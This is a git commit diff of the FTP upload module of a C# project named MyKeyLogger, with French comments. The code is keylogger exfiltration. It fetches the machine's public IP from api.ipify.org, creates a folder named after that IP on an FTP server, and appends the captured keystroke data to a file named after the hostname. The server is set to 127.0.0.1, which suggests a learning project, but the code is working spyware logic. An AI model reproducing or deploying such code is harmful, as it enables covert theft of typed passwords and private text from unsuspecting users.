ecfb5a0ad9c2bd57aecf9fe02fbb53994244c5a7
bdjemal <73447025+bdjemal@users.noreply.github.com>
2021-01-04 11:13:10 +0100

    add some small modification

--- MyKeyLogger/MyKeyLogger/ServerFTP.cs
+++ MyKeyLogger/MyKeyLogger/ServerFTP.cs
@@ -2,44 +2,131 @@
 using System.IO;
 using System.Net;
 using System.Text;
+using System.Windows.Forms;
 
 namespace MyKeyLogger
 {
 	public class ServerFTP
 	{
+		// Constructeur par defaut, il y a rien dedans
 		public ServerFTP(){}
-
 		
+		// Envoie des données saisies au clavier sur le serveur FTP
 		public static void ConnectionServer(string data)
-		{	
+		{		
+			string server = null;
+			string myIP = null;
 			string hostname = Dns.GetHostName();
-			string myIP = "";
-			string server = "";
 			WebClient client = new WebClient();
-		
-			FtpWebRequest request;
+			
+			byte[] buffer = null;
+			Stream stream = null;
+			FtpWebRequest ftpRequest = null;
+			FtpWebResponse ftpResponse = null;
 			
 			try {
-					myIP = client.DownloadString("https://api.ipify.org");
-					server = "ftp://127.0.0.1/" + myIP;
-					request = (FtpWebRequest)WebRequest.Create(server);
-					request.Credentials = new NetworkCredential("test", "");
-					request.Method = WebRequestMethods.Ftp.MakeDirectory;
-					WebResponse response = request.GetResponse();
+				
+				// L'API ipify permet d'obtenir l'IP publique du poste bureautique visible depuis Internet
+				myIP = client.DownloadString("https://api.ipify.org");
+				
 			} catch (Exception ex){
+				
+				//Message d'erreur : Le nom distant n'a pas pu être résolu: 'api.ipify.org'
+				Console.WriteLine(ex.Message);
+				
 			}
-			
-			server = "ftp://127.0.0.1/" + myIP + "/" + hostname + ".txt";
-			request = (FtpWebRequest)WebRequest.Create(server);
-			request.Credentials = new NetworkCredential("test", "");
 
-            request.Method = WebRequestMethods.Ftp.AppendFile;
-	       
-			Stream requestStream = request.GetRequestStream();		
-			byte[] buffer = Encoding.UTF8.GetBytes(data);
-			request.ContentLength = buffer.Length;				
-			requestStream.Write(buffer, 0, buffer.Length);
-			requestStream.Close();
+			// On poursuit le programme uniquement si le PC est connecté à Internet
+			if (myIP != null) {
+				
+				server = "ftp://127.0.0.1/" + myIP;
+				
+				try {
+					
+					// Initialise une instance de WebRequest
+					// https://docs.microsoft.com/fr-fr/dotnet/api/system.net.webrequest.create?view=net-5.0
+					ftpRequest = (FtpWebRequest)WebRequest.Create(server);
+					
+					// Fournit des informations d’identification
+					//ftpRequest.Credentials = new NetworkCredential("test", "");
+					
+					// Crée un répertoire sur le serveur FTP
+					// https://docs.microsoft.com/fr-fr/dotnet/api/system.net.webrequestmethods.ftp.makedirectory?view=net-5.0
+					ftpRequest.Method = WebRequestMethods.Ftp.MakeDirectory;
+					
+					// Envoi de la requête et attente de la réponse
+					// https://docs.microsoft.com/fr-fr/dotnet/api/system.net.ftpstatuscode?view=net-5.0
+					// Code 226 = Spécifie que le serveur ferme la connexion de données et que l'action demandée a abouti.
+					ftpResponse = (FtpWebResponse)ftpRequest.GetResponse(); 
+				
+					// Libère les ressources de l'objet de réponse
+					ftpResponse.Close();
+					
+				} catch (Exception ex){
+					
+					Console.WriteLine(ex.Message);
+					
+				}
+				
+				try {
+					
+					// Créer un fichier texte qui porte le nom du poste bureautique
+					server = server + "/" + hostname + ".txt";
+					
+					// Initialise une nouvelle instance de WebRequest
+					// https://docs.microsoft.com/fr-fr/dotnet/api/system.net.webrequest.create?view=net-5.0
+					ftpRequest = (FtpWebRequest)WebRequest.Create(server);
+		           
+					// Fournit des informations d’identification
+					//ftpRequest.Credentials = new NetworkCredential("test", "");
+					
+					// Ajoute un fichier sur le server FTP s'il n'existe pas
+					// https://docs.microsoft.com/fr-fr/dotnet/api/system.net.webrequestmethods.ftp.appendfile?view=net-5.0
+		            ftpRequest.Method = WebRequestMethods.Ftp.AppendFile;
+					
+		            // Envoi de la requête et attente de la réponse
+					ftpResponse = (FtpWebResponse)ftpRequest.GetResponse();
+					
+					// Libère les ressources de l'objet de réponse
+					ftpResponse.Close();
+					
+				} catch (Exception ex){
+					
+					Console.WriteLine(ex.Message);
+					
+				}
+			
+				try {
+				
+					// Encode la chaîne de caractères en une séquence d'octets.
+					buffer = Encoding.ASCII.GetBytes(data);
+					
+					// Obtenir le flux qui va contenir les données
+					stream = ftpRequest.GetRequestStream();
+					
+					// Définit la longueur du contenu de la chaîne en cours de transfert
+					ftpRequest.ContentLength = buffer.Length;	
+					
+					// Ecrit les données dans l’objet stream 
+					stream.Write(buffer, 0, buffer.Length);
+					
+					// Ferme l'objet requestStream
+					stream.Close();
+					
+					// Envoi la demande au serveur
+					ftpResponse = (FtpWebResponse)ftpRequest.GetResponse();
+					
+					// Libère les ressources de l'objet de réponse
+					ftpResponse.Close();
+		
+				} catch (Exception ex){
+
+						Console.WriteLine(ex.Message);
+						
+				}
+			}
 		}
-	}
+	}	
 }
+
+
